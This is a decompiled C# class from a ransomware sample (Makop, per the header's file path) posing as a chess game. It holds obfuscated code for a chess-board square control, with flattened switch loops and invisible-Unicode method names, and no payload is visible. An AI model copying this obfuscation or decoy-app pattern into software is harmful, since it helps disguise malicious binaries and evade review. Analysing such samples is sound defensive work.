// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.SimpleSquare
// Assembly: NU, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5FD10F56-6E8A-4A54-94FE-02843CD215B9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-8545c59f6fe59b3a5cdbad8923aa9b4a109dc03f4c003bdba937eacaafbfbf3c.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleChessApp.Game
{
  public class SimpleSquare : UserControl
  {
    private Color DefaultColor;
    private ChessPiece piece;
    private bool isBlackSquare;
    private IContainer components = (IContainer) null;
    public Panel panel1;

    public event EventHandler<MouseEventArgs> Click
    {
      add
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = 1865315752;
        EventHandler<MouseEventArgs> comparand;
        EventHandler<MouseEventArgs> eventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 890572372)) % 5U)
          {
            case 0:
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u202C⁪⁪‫‏⁮‪‎‪⁭‭⁪⁯‌‮⁪‪‫‎‬⁬‏‎⁮‎⁯⁪‫⁭‌‮⁪⁫‌‭‭⁭⁪⁯‬‮((Delegate) comparand, (Delegate) value);
              num1 = (int) num2 * -37582093 ^ -296563010;
              continue;
            case 1:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              int num3 = eventHandler1 != comparand ? -1228697182 : (num3 = -1335020530);
              num1 = num3 ^ (int) num2 * -774939366;
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            case 4:
              comparand = eventHandler1;
              num1 = 1461409301;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
      remove
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = 742983619;
        EventHandler<MouseEventArgs> comparand;
        EventHandler<MouseEventArgs> eventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1642658603)) % 6U)
          {
            case 0:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              num1 = (int) num2 * -684196978 ^ -2016025690;
              continue;
            case 1:
              goto label_3;
            case 2:
              comparand = eventHandler1;
              num1 = 1903401372;
              continue;
            case 3:
              int num3 = eventHandler1 == comparand ? -1053930905 : (num3 = -1976259140);
              num1 = num3 ^ (int) num2 * -971504629;
              continue;
            case 4:
              goto label_1;
            case 5:
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u202E⁬‌⁯⁬‫⁫‍⁯‎‫​⁪‍‎‮⁮‎‌‎‬‪​‭⁫⁫‮‏⁯‍⁫‍⁮‮⁮‌‭⁯⁪‌‮((Delegate) comparand, (Delegate) value);
              num1 = (int) num2 * 1366201558 ^ 1894672585;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public ChessPiece Piece
    {
      get
      {
label_1:
        int num1 = -1558607311;
        ChessPiece piece;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1007017015)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              piece = this.piece;
              num1 = (int) num2 * -532864487 ^ -2017034113;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return piece;
      }
      set
      {
        this.piece = value;
label_1:
        int num1 = 2053613144;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 807362229)) % 7U)
          {
            case 0:
              num1 = (int) num2 * 865374787 ^ 181002358;
              continue;
            case 1:
              this.piece = (ChessPiece) null;
              SimpleSquare.\u206A‏‏⁫⁭‬‏‬⁭‪‌‫⁯‍‬⁪‭‫‫‬‪‏⁭⁯‬‌⁫‏‏‌‪‪⁬⁭‏⁬⁮​‫⁪‮((Control) this, (Image) null);
              num1 = (int) num2 * -321716337 ^ 1777823935;
              continue;
            case 2:
              goto label_1;
            case 3:
              int num3 = this.piece != null ? 1208755385 : (num3 = 108884747);
              num1 = num3 ^ (int) num2 * 373999614;
              continue;
            case 4:
              num1 = (int) num2 * -1273991114 ^ 791992973;
              continue;
            case 5:
              goto label_3;
            case 6:
              SimpleSquare.\u206A‏‏⁫⁭‬‏‬⁭‪‌‫⁯‍‬⁪‭‫‫‬‪‏⁭⁯‬‌⁫‏‏‌‪‪⁬⁭‏⁬⁮​‫⁪‮((Control) this, this.repo.GetPiece(this.piece.Kind, this.piece.Color));
              num1 = 1144044288;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    public void colorSquare()
    {
label_1:
      int num1 = -913403038;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2114331487)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            SimpleSquare.\u200B⁭‮‭⁮‫‎‬‭⁪​​‍‎‏⁪‎⁮‌​​⁫‭‌⁫‬‌‌⁫‫‌‎‮‏⁪‍​⁫⁮⁯‮((Control) this, this.DefaultColor);
            num1 = (int) num2 * -815065272 ^ -868440337;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.DefaultColor = this.IsBlackSquare ? Color.CornflowerBlue : Color.WhiteSmoke;
            num1 = -1149793016;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public Pieces Kind
    {
      set
      {
        this.Piece.Kind = value;
        this.Piece = this.Piece;
      }
    }

    public bool IsBlackSquare
    {
      get => this.isBlackSquare;
      set
      {
label_1:
        int num1 = 1064893059;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 852460118)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              this.isBlackSquare = value;
              this.colorSquare();
              num1 = (int) num2 * 906997075 ^ 672068333;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public Repository repo
    {
      get
      {
label_1:
        int num1 = -1911612951;
        Repository repo;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1672919726)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              repo = ChessContext.repo;
              num1 = (int) num2 * 1171618878 ^ -669611420;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return repo;
      }
    }

    public SimpleSquare()
    {
      this.InitializeComponent();
      SimpleSquare.\u206D‮‭⁭‌‮‪⁪‎‪‌⁯‮‌‏‫‏⁮‌​⁬‌‫‎​⁮​‭‎⁭⁬‮‍‌​‫‪⁭⁬⁮‮((Control) this, new MouseEventHandler(this.Square_MouseClick));
      SimpleSquare.\u206D‪‫⁪⁮‎⁪⁪⁮⁫‬⁭⁫​‫⁮‏‮‫‮​‪‬⁯⁫​‍⁫⁭‎⁯⁯⁪⁯‍‏‌⁯‭⁭‮((Control) this.panel1, new MouseEventHandler(this.Square_MouseClick));
    }

    private void Square_MouseClick(object sender, MouseEventArgs e)
    {
label_1:
      int num1 = -1974699918;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -493472149)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            EventHandler<MouseEventArgs> click = this.Click;
            if (click != null)
            {
              click((object) this, e);
              num1 = (int) num2 * -1362493373 ^ -568053153;
              continue;
            }
            goto label_5;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * 1771342044 ^ 643927943;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_5:;
    }

    public void HighLight()
    {
label_1:
      int num1 = 1821163912;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 590383774)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 308656667 ^ -1702921134;
            continue;
          case 2:
            SimpleSquare.\u200B⁭‮‭⁮‫‎‬‭⁪​​‍‎‏⁪‎⁮‌​​⁫‭‌⁫‬‌‌⁫‫‌‎‮‏⁪‍​⁫⁮⁯‮((Control) this, Color.ForestGreen);
            num1 = (int) num2 * -1292861389 ^ -704040643;
            continue;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public void ClearHighLight()
    {
label_1:
      int num1 = -861063302;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -298881953)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -849518275 ^ -448118071;
            continue;
          case 1:
            SimpleSquare.\u200B⁭‮‭⁮‫‎‬‭⁪​​‍‎‏⁪‎⁮‌​​⁫‭‌⁫‬‌‌⁫‫‌‎‮‏⁪‍​⁫⁮⁯‮((Control) this, this.DefaultColor);
            num1 = (int) num2 * -1462449182 ^ 932493317;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:;
    }

    public bool IsEmpty
    {
      get
      {
label_1:
        int num1 = -1518858158;
        bool isEmpty;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -426065589)) % 4U)
          {
            case 1:
              isEmpty = this.Piece == null;
              num1 = (int) num2 * -1788997478 ^ -1873541749;
              continue;
            case 2:
              num1 = (int) num2 * 1661405927 ^ 461859109;
              continue;
            case 3:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return isEmpty;
      }
    }

    protected override void Dispose(bool disposing)
    {
label_1:
      int num1 = -1737906773;
      while (true)
      {
        uint num2;
        int num3;
        switch ((num2 = (uint) (num1 ^ -1529135131)) % 9U)
        {
          case 0:
            num1 = (int) num2 * -1288301954 ^ -2147127724;
            continue;
          case 1:
            SimpleSquare.\u202B‭⁮‮⁯‫‬‮‪‏⁭‮⁫⁭‌‏‍‌‌⁭⁫‎⁪​​‪⁯‫​⁫​⁯⁯​‌‎‬⁭‫⁭‮((IDisposable) this.components);
            num1 = (int) num2 * -731975102 ^ -1695173025;
            continue;
          case 2:
            if (!disposing)
            {
              num3 = 0;
              break;
            }
            num1 = (int) num2 * -136381179 ^ 1227780687;
            continue;
          case 3:
            goto label_1;
          case 4:
            num3 = this.components != null ? 1 : 0;
            break;
          case 5:
            goto label_3;
          case 6:
            num1 = (int) num2 * 29426015 ^ -754703293;
            continue;
          case 7:
            num1 = (int) num2 * 1913495939 ^ 1485990131;
            continue;
          case 8:
            base.Dispose(disposing);
            num1 = -95391665;
            continue;
          default:
            goto label_14;
        }
        int num4;
        num1 = num4 = num3 != 0 ? -1444952316 : (num4 = -1589007360);
      }
label_3:
      return;
label_14:;
    }

    private void InitializeComponent()
    {
      this.panel1 = SimpleSquare.\u200E​‍⁪‌⁪⁪⁬‌‬⁮‭⁯‬⁬‪‍⁮⁮​‫‍⁪‫‭⁯‌‎‪⁯‮‭‌⁫⁮‏‫⁮‮⁪‮();
label_1:
      int num1 = -866876506;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1395133684)) % 16U)
        {
          case 0:
            SimpleSquare.\u202E⁯​⁫‫‭‌‪⁭⁭‍‫‌‮‬⁭⁭‎⁬​⁭⁮‫⁫‏‮‫⁭​⁮⁬‍‬‪​‪⁫‮⁪⁬‮((Control) this, false);
            num1 = (int) num2 * -2120790184 ^ -391402844;
            continue;
          case 1:
            SimpleSquare.\u200B⁭‮‭⁮‫‎‬‭⁪​​‍‎‏⁪‎⁮‌​​⁫‭‌⁫‬‌‌⁫‫‌‎‮‏⁪‍​⁫⁮⁯‮((Control) this.panel1, Color.Transparent);
            num1 = (int) num2 * -590548432 ^ 241839425;
            continue;
          case 2:
            SimpleSquare.\u206E​‫⁯‌‭‫‎‏‎‪‪‏⁭⁮‪⁭‬‫‬⁮⁭‍‭‏‎⁭​‫‌​‎‏‎‮‮‮‍‭‮((Control) this, new Padding(0));
            SimpleSquare.\u200B⁬‎​‌‍‌​‫​‫‍​⁪‌‎⁬‏⁮‭‭‮⁫⁯‮‫‫‭‮⁬⁬​‏‍⁫‫‮‎‏‪‮((Control) this, \u003CModule\u003E.\u200F⁫​⁫⁫⁯⁭‭‮⁯‍⁭⁮‪⁭‍‫‫⁪⁬⁮‮‫⁫‏⁮‬‬⁫‬‭‍⁬‫⁮‌⁬⁫⁮⁮‮<string>(574069743U));
            num1 = (int) num2 * 1562756981 ^ -364466257;
            continue;
          case 3:
            SimpleSquare.\u206B‭‪‍‪‍‪‌‎‌‪‎​‌​​⁮‎⁭‍⁬​​‏‬⁯‌⁯⁮‪⁬‍⁫‌‏‬‏⁭⁪‌‮((Control) this, ImageLayout.Center);
            SimpleSquare.\u206C‫⁫‍‌⁯⁫‏‫⁫‭⁫⁯​⁮⁯⁯‌‎‏⁫‌‍⁯‪‎‭‫‫⁭‮‮⁬⁬‬‍⁮‪⁫‏‮(SimpleSquare.\u202A⁬‪‪‬⁬‎⁪‭⁬‫⁯⁫‮‍‍‏‎‪⁫⁪⁭‬‬‮‭‌‏⁮‍⁮⁭⁮⁯⁬‎‫‪‍‮((Control) this), (Control) this.panel1);
            num1 = (int) num2 * 601753736 ^ 1277743974;
            continue;
          case 4:
            SimpleSquare.\u202D‮‫‫‏‪‎‏⁪‌‭⁫‏⁮‭‫‭‬‬‬⁭⁫‍‎‌⁮⁮‏⁪‏⁯​‮‬‭‮‌‎⁮‫‮((ContainerControl) this, AutoScaleMode.Font);
            num1 = (int) num2 * -1058500930 ^ -2062967657;
            continue;
          case 5:
            SimpleSquare.\u202A‌​‌‮‍‍⁮⁪‏‮‎‬​⁬⁯‌⁭‎⁪‎‎‬‫⁪‍‭⁬‏⁯⁬⁬‍⁮‌⁪‌⁫‎‮‮((Control) this.panel1, new Point(0, 0));
            num1 = (int) num2 * 1336030561 ^ 695866050;
            continue;
          case 6:
            SimpleSquare.\u206D‍‍⁭‌‬​⁬⁬‏‬⁬‎‌⁪‬‮‪⁯‮‌‬‭‮⁪⁯⁮‌‏⁮⁯⁯⁮⁯‎⁪⁪‬‫‏‮((Control) this.panel1, new Size(137, 132));
            SimpleSquare.\u200E‪⁪⁮‮‬​‮‮⁮⁮‭‎‭⁭⁬‬‏⁮⁭⁫‌‫⁬‪‭⁭‬⁪‬‌‏‎⁬⁫‎‪⁯⁭‫‮((Control) this.panel1, 0);
            SimpleSquare.\u206C‮‌‌‍‎⁫​‪‍‍‭‌‪‌⁮‌‏‪⁪​‍‭‪‫‬‍‌⁫‫‫‬‎⁭‏‏⁪‌‪‬‮((ContainerControl) this, new SizeF(6f, 13f));
            num1 = (int) num2 * 1467210552 ^ -3942616;
            continue;
          case 7:
            SimpleSquare.\u200C‬‍‍‏‭⁫⁯⁫‏‫⁮‭‪⁪‌‪​‮‮‍⁫⁭‍‮‌⁬‫‭‫⁫‬‮‎​⁭⁭⁯⁬‪‮((Control) this.panel1, \u003CModule\u003E.\u200F⁫​⁫⁫⁯⁭‭‮⁯‍⁭⁮‪⁭‍‫‫⁪⁬⁮‮‫⁫‏⁮‬‬⁫‬‭‍⁬‫⁮‌⁬⁫⁮⁮‮<string>(3480510927U));
            num1 = (int) num2 * -1872256078 ^ -607515980;
            continue;
          case 8:
            goto label_3;
          case 9:
            num1 = (int) num2 * 2094698630 ^ 1434138789;
            continue;
          case 10:
            SimpleSquare.\u206F⁪⁫‮⁪​⁮‍‬‍⁬‏⁯⁮‌‏‌‎⁫⁭‏​⁭‌⁪‫⁮‎‏⁮‬⁫⁫‎⁮​‫⁪⁮‫‮((Control) this);
            num1 = (int) num2 * -822223196 ^ 1374795461;
            continue;
          case 11:
            num1 = (int) num2 * -1298096795 ^ 940509500;
            continue;
          case 12:
            SimpleSquare.\u200F‫‍⁭⁬‫‌‎‏‍‮‬⁪‫⁭⁫‎⁭‌‍‭‪​‪⁯⁯⁯‍‭‮‍‮⁯‍‬‎⁮‪⁭‎‮((Control) this.panel1, DockStyle.Fill);
            num1 = (int) num2 * 504747842 ^ -733389423;
            continue;
          case 13:
            SimpleSquare.\u206B‭‪‍‪‍‪‌‎‌‪‎​‌​​⁮‎⁭‍⁬​​‏‬⁯‌⁯⁮‪⁬‍⁫‌‏‬‏⁭⁪‌‮((Control) this.panel1, ImageLayout.Center);
            num1 = (int) num2 * -1299544937 ^ 1850172603;
            continue;
          case 14:
            goto label_1;
          case 15:
            SimpleSquare.\u206A⁯​⁯⁯⁫⁯⁬‭⁫‬‏‫‎‫⁬‍⁬⁮‫⁫‮⁭⁫‫⁬‫‪‌‪⁯⁫‫‍⁪‌⁫‌‎⁯‮((Control) this, new Size(137, 132));
            num1 = (int) num2 * 306707015 ^ -2147006699;
            continue;
          default:
            goto label_18;
        }
      }
label_3:
      return;
label_18:;
    }

    static Delegate \u202C⁪⁪‫‏⁮‪‎‪⁭‭⁪⁯‌‮⁪‪‫‎‬⁬‏‎⁮‎⁯⁪‫⁭‌‮⁪⁫‌‭‭⁭⁪⁯‬‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u202E⁬‌⁯⁬‫⁫‍⁯‎‫​⁪‍‎‮⁮‎‌‎‬‪​‭⁫⁫‮‏⁯‍⁫‍⁮‮⁮‌‭⁯⁪‌‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static void \u206A‏‏⁫⁭‬‏‬⁭‪‌‫⁯‍‬⁪‭‫‫‬‪‏⁭⁯‬‌⁫‏‏‌‪‪⁬⁭‏⁬⁮​‫⁪‮([In] Control obj0, [In] Image obj1) => obj0.BackgroundImage = obj1;

    static void \u200B⁭‮‭⁮‫‎‬‭⁪​​‍‎‏⁪‎⁮‌​​⁫‭‌⁫‬‌‌⁫‫‌‎‮‏⁪‍​⁫⁮⁯‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static void \u206D‮‭⁭‌‮‪⁪‎‪‌⁯‮‌‏‫‏⁮‌​⁬‌‫‎​⁮​‭‎⁭⁬‮‍‌​‫‪⁭⁬⁮‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u206D‪‫⁪⁮‎⁪⁪⁮⁫‬⁭⁫​‫⁮‏‮‫‮​‪‬⁯⁫​‍⁫⁭‎⁯⁯⁪⁯‍‏‌⁯‭⁭‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u202B‭⁮‮⁯‫‬‮‪‏⁭‮⁫⁭‌‏‍‌‌⁭⁫‎⁪​​‪⁯‫​⁫​⁯⁯​‌‎‬⁭‫⁭‮([In] IDisposable obj0) => obj0.Dispose();

    static Panel \u200E​‍⁪‌⁪⁪⁬‌‬⁮‭⁯‬⁬‪‍⁮⁮​‫‍⁪‫‭⁯‌‎‪⁯‮‭‌⁫⁮‏‫⁮‮⁪‮() => new Panel();

    static void \u206F⁪⁫‮⁪​⁮‍‬‍⁬‏⁯⁮‌‏‌‎⁫⁭‏​⁭‌⁪‫⁮‎‏⁮‬⁫⁫‎⁮​‫⁪⁮‫‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u206B‭‪‍‪‍‪‌‎‌‪‎​‌​​⁮‎⁭‍⁬​​‏‬⁯‌⁯⁮‪⁬‍⁫‌‏‬‏⁭⁪‌‮([In] Control obj0, [In] ImageLayout obj1) => obj0.BackgroundImageLayout = obj1;

    static void \u200F‫‍⁭⁬‫‌‎‏‍‮‬⁪‫⁭⁫‎⁭‌‍‭‪​‪⁯⁯⁯‍‭‮‍‮⁯‍‬‎⁮‪⁭‎‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static void \u202A‌​‌‮‍‍⁮⁪‏‮‎‬​⁬⁯‌⁭‎⁪‎‎‬‫⁪‍‭⁬‏⁯⁬⁬‍⁮‌⁪‌⁫‎‮‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static void \u200C‬‍‍‏‭⁫⁯⁫‏‫⁮‭‪⁪‌‪​‮‮‍⁫⁭‍‮‌⁬‫‭‫⁫‬‮‎​⁭⁭⁯⁬‪‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u206D‍‍⁭‌‬​⁬⁬‏‬⁬‎‌⁪‬‮‪⁯‮‌‬‭‮⁪⁯⁮‌‏⁮⁯⁯⁮⁯‎⁪⁪‬‫‏‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u200E‪⁪⁮‮‬​‮‮⁮⁮‭‎‭⁭⁬‬‏⁮⁭⁫‌‫⁬‪‭⁭‬⁪‬‌‏‎⁬⁫‎‪⁯⁭‫‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static void \u206C‮‌‌‍‎⁫​‪‍‍‭‌‪‌⁮‌‏‪⁪​‍‭‪‫‬‍‌⁫‫‫‬‎⁭‏‏⁪‌‪‬‮([In] ContainerControl obj0, [In] SizeF obj1) => obj0.AutoScaleDimensions = obj1;

    static void \u202D‮‫‫‏‪‎‏⁪‌‭⁫‏⁮‭‫‭‬‬‬⁭⁫‍‎‌⁮⁮‏⁪‏⁯​‮‬‭‮‌‎⁮‫‮(
      [In] ContainerControl obj0,
      [In] AutoScaleMode obj1)
    {
      obj0.AutoScaleMode = obj1;
    }

    static Control.ControlCollection \u202A⁬‪‪‬⁬‎⁪‭⁬‫⁯⁫‮‍‍‏‎‪⁫⁪⁭‬‬‮‭‌‏⁮‍⁮⁭⁮⁯⁬‎‫‪‍‮(
      [In] Control obj0)
    {
      return obj0.Controls;
    }

    static void \u206C‫⁫‍‌⁯⁫‏‫⁫‭⁫⁯​⁮⁯⁯‌‎‏⁫‌‍⁯‪‎‭‫‫⁭‮‮⁬⁬‬‍⁮‪⁫‏‮(
      [In] Control.ControlCollection obj0,
      [In] Control obj1)
    {
      obj0.Add(obj1);
    }

    static void \u206E​‫⁯‌‭‫‎‏‎‪‪‏⁭⁮‪⁭‬‫‬⁮⁭‍‭‏‎⁭​‫‌​‎‏‎‮‮‮‍‭‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u200B⁬‎​‌‍‌​‫​‫‍​⁪‌‎⁬‏⁮‭‭‮⁫⁯‮‫‫‭‮⁬⁬​‏‍⁫‫‮‎‏‪‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u206A⁯​⁯⁯⁫⁯⁬‭⁫‬‏‫‎‫⁬‍⁬⁮‫⁫‮⁭⁫‫⁬‫‪‌‪⁯⁫‫‍⁪‌⁫‌‎⁯‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u202E⁯​⁫‫‭‌‪⁭⁭‍‫‌‮‬⁭⁭‎⁬​⁭⁮‫⁫‏‮‫⁭​⁮⁬‍‬‪​‪⁫‮⁪⁬‮([In] Control obj0, [In] bool obj1) => obj0.ResumeLayout(obj1);
  }
}
